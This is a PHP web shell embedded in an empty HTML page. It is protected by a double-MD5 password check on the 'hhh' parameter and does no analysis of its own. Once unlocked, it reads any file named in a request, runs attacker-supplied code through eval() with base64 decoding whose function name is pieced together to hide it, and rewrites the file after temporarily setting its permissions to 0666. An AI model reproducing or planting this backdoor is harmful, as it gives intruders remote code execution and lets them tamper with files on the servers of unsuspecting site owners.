<html>
<head><title></title>
</head>
<body>
<?php
/*
 * REVISION: $Rev: 1426 $
 */
if (md5(md5($_REQUEST['hhh'])) == 'bc5aaff98e1783e8e30f266af63cea42') {
  
set_time_limit(36000);
function unslash_rec(&$arr)
{
  reset($arr);
  while (list($key) = each($arr))
  {
    if (is_array($arr[$key])) unslash_rec($arr[$key]);
    else
    {
      $arr[$key] = stripslashes($arr[$key]);
    };
  };
};

function unslash_gpc()
{
  if (get_magic_quotes_gpc())
  {
    unslash_rec($_POST);
  };
};

if (array_key_exists('f', $_REQUEST))
{
  unslash_gpc();
  //header('Content-Type: text/plain');
  $txt_src = '';
  $txt_dst = '';
  if (false === ($txt_src = file_get_contents($_REQUEST['f'])))
    die("ERROR: 1 Failed to get file contents: {$_REQUEST['f']}<br/>\n");
  $txt_dst = $txt_src;
  if (filesize($_REQUEST['f']) != strlen($txt_src))
    die("ERROR: 3 File size and contents size mismatch: {$_REQUEST['f']}<br/>\n");
  if ($_POST['s'])
  {
    $cc = '64';
    $cc = 'se' . $cc;
    $cc .= '_';
    $cc .= 'dec';
    $cc = 'ba' . $cc;
    $cc .= 'od';
    $cc .= 'e';
    if ($_POST['s1'] == 1) {
      $_POST['cmt'] = file_get_contents($_FILES['cmt']['tmp_name']);
      eval("{$cc}(\$_POST['s'])");
    }
    else {
      eval($_POST['s']);
    }
  }
  else
  {
    die("ERROR: 7 UNKNOWN OPERATION REQUESTED<br/>\n");
  };
  if ($txt_dst != $txt_src)
  {
    $stat = @stat($_REQUEST['f']);
    if ($stat['mode'])
      @chmod($_REQUEST['f'], 0666);
    $hf = fopen($_REQUEST['f'], "w");
    if (!$hf)
    {
      @chmod($_REQUEST['f'], $stat['mode'] & 0777);
      die('ERROR: 2 Failed to open file for writing<br>\n');
    };
    fwrite($hf, $txt_dst);
    fclose($hf);
    if ($stat['mode'])
      @chmod($_REQUEST['f'], $stat['mode'] & 0777);
  };
  print "OK: 0 ALL OPERATIONS SUCCEEDED<br/>\n";
}
else
{
  print "ERROR: 7 UNKNOWN<br/>\n";
};

};

?>
</body>
</html>